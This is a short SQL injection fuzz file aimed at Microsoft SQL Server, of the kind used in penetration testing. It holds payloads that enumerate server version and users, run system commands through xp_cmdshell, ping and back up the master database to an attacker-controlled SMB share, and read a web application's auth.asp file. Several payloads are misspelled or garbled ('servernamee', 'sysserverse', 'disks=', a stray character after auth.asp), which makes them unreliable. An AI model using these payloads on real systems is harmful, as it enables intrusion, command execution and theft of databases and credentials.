# ms-sqli info disclosure payload fuzzfile
# replace regex with your fuzzer for best results <attackerip> <sharename>
# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
# might need to terminate payloads with ;--
select @@version
select @@servernamee
select @@microsoftversione
select * from master..sysserverse
select * from sysusers
exec master..xp_cmdshell 'ipconfig+/all'	
exec master..xp_cmdshell 'net+view'
exec master..xp_cmdshell 'net+users'
exec master..xp_cmdshell 'ping+<attackerip>'
BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--
